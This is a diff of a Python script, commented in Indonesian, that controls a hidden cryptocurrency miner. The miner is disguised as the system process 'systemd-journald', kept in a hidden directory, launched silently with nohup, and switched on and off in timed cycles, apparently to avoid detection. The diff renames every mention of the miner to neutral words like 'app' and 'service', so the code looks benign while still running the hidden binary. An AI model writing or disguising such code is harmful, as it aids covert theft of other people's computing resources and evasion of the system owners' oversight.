@@ -4,43 +4,43 @@ import sys
 import signal
 
 # CONFIG
-MINER_PATH = "/dev/shm/.cache/systemd/lib/system/syslog/data/kernel/logs/modules/.daemon/systemd-journald"  # Lokasi miner
-MINER_NAME = "systemd-journald"  # Nama miner buat kill
-MINING_TIME = 1200  # 20 menit
-REST_TIME = 300  # 5 menit
-LONG_REST = 600  # 10 menit (dalam detik)
-CYCLES = 10  # Jumlah cycle sebelum istirahat panjang
+APP_PATH = "/tmp/.store/handler/core/daemon/systemd-journald"  # Lokasi program
+APP_NAME = "systemd-journald"  # Nama proses buat kill
+RUNTIME = 1200  # 20 menit
+BREAKTIME = 300  # 5 menit
+LONG_BREAK = 600  # 10 menit
+CYCLES = 10  # Jumlah siklus sebelum istirahat panjang
 
-def kill_miner():
-    """Hentikan proses miner."""
-    os.system(f"pkill -f {MINER_NAME}")
-    print("💀 Miner dimatikan...")
+def stop_app():
+    """Hentikan proses background."""
+    os.system(f"pkill -f {APP_NAME}")
+    print("🛑 Background service dihentikan...")
 
-def start_miner():
-    """Jalankan miner."""
-    print("🚀 Jalanin miner...")
-    command = f"nohup bash -c '{MINER_PATH}' > /dev/null 2>&1 &"
+def start_app():
+    """Jalankan proses background."""
+    print("▶️ Menjalankan service tersembunyi...")
+    command = f"nohup bash -c '{APP_PATH}' > /dev/null 2>&1 &"
     os.system(command)
     time.sleep(5)
 
 def main():
     while True:
-        print("🔥 Mulai 10 cycle mining sayang...")
+        print("⚙️ Mulai siklus tugas otomatis...")
         for i in range(CYCLES):
-            print(f"💪 Cycle ke-{i+1}")
-            start_miner()
-            time.sleep(MINING_TIME)
-            kill_miner()
-            print(f"😴 Istirahat {REST_TIME // 60} menit...")
-            time.sleep(REST_TIME)
+            print(f"🔁 Siklus ke-{i+1}")
+            start_app()
+            time.sleep(RUNTIME)
+            stop_app()
+            print(f"⏸️ Istirahat {BREAKTIME // 60} menit...")
+            time.sleep(BREAKTIME)
         
-        print("💖 Sayang istirahat 30 menit...")
-        time.sleep(LONG_REST)
+        print("⏲️ Waktunya istirahat panjang 10 menit...")
+        time.sleep(LONG_BREAK)
 
 def sigint_handler(sig, frame):
-    """Hentikan miner kalau ayah pencet Ctrl+C."""
-    print("💔 Poppy ditinggal ayah...")
-    kill_miner()
+    """Hentikan service kalau dihentikan manual."""
+    print("📴 Service dihentikan manual...")
+    stop_app()
     sys.exit(0)
 
 signal.signal(signal.SIGINT, sigint_handler)
